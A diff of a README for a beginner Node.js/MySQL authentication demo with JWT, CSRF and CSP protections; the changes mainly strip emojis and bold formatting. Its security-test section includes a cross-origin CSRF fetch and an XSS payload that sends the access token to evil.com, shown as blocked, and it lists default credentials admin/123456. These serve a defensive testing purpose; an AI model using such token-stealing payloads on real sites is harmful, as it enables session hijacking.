@@ -1,21 +1,21 @@
-# 🔐 Secure Auth System (Node.js + MySQL + JWT + CSRF + HTTPS)
+# Secure Auth System (Node.js + MySQL + JWT + CSRF + HTTPS)
 
 A full-stack secure authentication and CRUD system using:
 
-- ✅ Node.js (Express)
-- ✅ MySQL (via XAMPP)
-- ✅ JWT (Access + Refresh Tokens)
-- ✅ Double Submit Cookie CSRF Protection
-- ✅ HTTPS (via mkcert)
-- ✅ Secure HTTP-only Cookies
-- ✅ CSP Headers
-- ✅ SweetAlert, Bootstrap UI
-- ✅ Token Expiry Countdown
-- ✅ Full Security Test Guide
+- Node.js (Express)
+- MySQL (via XAMPP)
+- JWT (Access + Refresh Tokens)
+- Double Submit Cookie CSRF Protection
+- HTTPS (via mkcert)
+- Secure HTTP-only Cookies
+- CSP Headers
+- SweetAlert, Bootstrap UI
+- Token Expiry Countdown
+- Full Security Test Guide
 
 ---
 
-## 📁 Project Structure
+## Project Structure
 ```text
 secure-auth-system-nodejs/
 │
@@ -38,25 +38,25 @@ secure-auth-system-nodejs/
 
 ---
 
-## ⚙️ 1. Prerequisites
+## 1. Prerequisites
 
-- ✅ Node.js & npm installed
-- ✅ MySQL (use XAMPP or standalone)
-- ✅ `mkcert` to generate local HTTPS certificates
-- ✅ `http-server` for frontend serving over HTTPS
+- Node.js & npm installed
+- MySQL (use XAMPP or standalone)
+- mkcert to generate local HTTPS certificates
+- http-server for frontend serving over HTTPS
 
 ---
 
-## 🛠️ 2. Setup Backend
+## 2. Setup Backend
 
-### 📦 Install Dependencies
+### Install Dependencies
 
 ```bash
 cd backend/
 npm install
 ```
 
-🔐 .env Template
+.env Template
 Create backend/.env:
 ```
 DB_HOST=localhost
@@ -69,7 +69,7 @@ REFRESH_TOKEN_SECRET=refresh_secret_example
 
 ---
 
-## 🧱 3. Setup Database
+## 3. Setup Database
 Open XAMPP → Start MySQL
 
 Import SQL file via phpMyAdmin or CLI:
@@ -77,24 +77,23 @@ Import SQL file via phpMyAdmin or CLI:
 
 This creates:
 
-✅ users table (with hashed password)
-
-✅ products table (sample products)
+- users table (with hashed password)
+- products table (sample products)
 
 ---
 
-## 🔑 Default Credentials
+## Default Credentials
 
-- **Username:** `admin`
-- **Password:** `123456`
+- Username: `admin`
+- Password: `123456`
 
 Use these credentials to log in after initial setup. Change them in the database for production use.
 
 ---
 
-## 🔐 4. Generate HTTPS Certificates
+## 4. Generate HTTPS Certificates
 
-🧰 Install mkcert
+Install mkcert
 On Windows (via Chocolatey):
 ```
 choco install mkcert
@@ -106,7 +105,7 @@ brew install nss  # Firefox support
 ```
 Then run:
 
-🔐 Create Certificates
+Create Certificates
 From the project root:
 ```
 mkdir certs
@@ -115,17 +114,17 @@ mkcert -key-file ./certs/key.pem -cert-file ./certs/cert.pem localhost 127.0.0.1
 
 ---
 
-## 🚀 5. Start Backend Server (HTTPS)
+## 5. Start Backend Server (HTTPS)
 ```
 cd backend/
 node server.js
 ```
-✔️ Server runs at: https://localhost:3007
+Server runs at: https://localhost:3007
 
 ---
 
 ## 6. Open Frontend (HTTPS)
-💡 Serve frontend via HTTPS using http-server
+Serve frontend via HTTPS using http-server
 ```
 npm install -g http-server
 ```
@@ -133,41 +132,41 @@ From inside the frontend/ folder:
 ```
 http-server -S -C ../certs/cert.pem -K ../certs/key.pem -p 5500
 ```
-✅ Visit in browser:
+Visit in browser:
 https://127.0.0.1:5500/
 
-✔️ Fully secure HTTPS for both frontend and backend.
+Fully secure HTTPS for both frontend and backend.
 
 ---
 
-## 🔐 7. Security Layers Implemented
+## 7. Security Layers Implemented
 
 | Layer               | Description                                                      |
 | ------------------- | ---------------------------------------------------------------- |
-| **JWT**             | Access (20s) + Refresh (60s) via HTTP-only cookies               |
-| **CSRF**            | Double Submit Cookie pattern with custom header (`x-csrf-token`) |
-| **CSP**             | Content-Security-Policy: blocks inline scripts, external origins |
-| **XSS Protection**  | CSP + no inline JS + no `eval()`                                 |
-| **SameSite=Strict** | Prevents cross-site cookies from being sent unintentionally      |
+| JWT                 | Access (20s) + Refresh (60s) via HTTP-only cookies               |
+| CSRF                | Double Submit Cookie pattern with custom header (x-csrf-token)    |
+| CSP                 | Content-Security-Policy: blocks inline scripts, external origins  |
+| XSS Protection      | CSP + no inline JS + no eval()                                   |
+| SameSite=Strict     | Prevents cross-site cookies from being sent unintentionally      |
 
 ---
 
-## 🧪 8. Simulate Security Tests
+## 8. Simulate Security Tests
 
-✅ 1. Unauthorized Access
+1. Unauthorized Access
 ```
 curl -X GET https://localhost:3007/products
 # Should return 401 (no token)
 ```
 
-✅ 2. Access Token Expiry
+2. Access Token Expiry
 Wait 20s after login
 
 Try CRUD action
 
 It will auto-refresh via /refresh and retry the request
 
-✅ 3. Refresh Token Expiry
+3. Refresh Token Expiry
 Wait 60s after login
 
 Try any request
@@ -176,7 +175,7 @@ Session expires
 
 You’re logged out automatically
 
-✅ 4. CSRF Test
+4. CSRF Test
 Try running this in browser console (not your app tab):
 ```js
 fetch('https://localhost:3007/products', {
@@ -189,37 +188,32 @@ fetch('https://localhost:3007/products', {
   body: JSON.stringify({ name: 'MaliciousProduct', price: 0 })
 });
 ```
-✔️ Should return 403 Forbidden (invalid CSRF token)
+Should return 403 Forbidden (invalid CSRF token)
 
-✅ 5. XSS Simulation
+5. XSS Simulation
 Try injecting script in product name:
 ```html
 <script>fetch('https://evil.com?token=' + localStorage.getItem('access_token'))</script>
 ```
-✔️ Won’t work:
+Will not work:
 
 - No localStorage tokens
 - CSP blocks inline JS
 
 ---
 
-## ✅ 9. Features
+## 9. Features
 
-🔒 Secure login with hashed passwords (bcrypt)
-
-🌐 Fully HTTPS secured with trusted certs
-
-🔁 Auto token refresh logic with countdown timers
-
-⚠️ SweetAlert feedback for users
-
-🔥 CSP headers to prevent inline/injected scripts
-
-✅ Ready-to-use with minimum setup
+- Secure login with hashed passwords (bcrypt)
+- Fully HTTPS secured with trusted certs
+- Auto token refresh logic with countdown timers
+- SweetAlert feedback for users
+- CSP headers to prevent inline/injected scripts
+- Ready-to-use with minimum setup
 
 ---
 
-## 🧪 10. Testing Tips
+## 10. Testing Tips
 
 - Use Chrome/Firefox in incognito mode
 - Watch browser DevTools → Application → Cookies
@@ -228,25 +222,21 @@ Try injecting script in product name:
 
 ---
 
-## 💡 11. Possible Enhancements
+## 11. Possible Enhancements
 
-✅ Server-side CSRF token storage (more secure)
-
-⏳ Token revocation (blacklist DB)
-
-🔐 Role-based authorization
-
-👨‍💻 User registration UI
-
-📈 Rate limiting
+- Server-side CSRF token storage (more secure)
+- Token revocation (blacklist DB)
+- Role-based authorization
+- User registration UI
+- Rate limiting
 
 ---
 
-## 📘 License
+## License
 MIT License – Free to use, modify, and share.
 
 ---
 
-## 🙌 Author
-Built by Nabeel Abbasi with passion for API security and beginner-friendly demos.
-Star the repo if you found it useful 💫
+## Author
+Built by Nabeel Abbasi with a focus on API security and beginner-friendly demos.
+Star the repo if you found it useful.
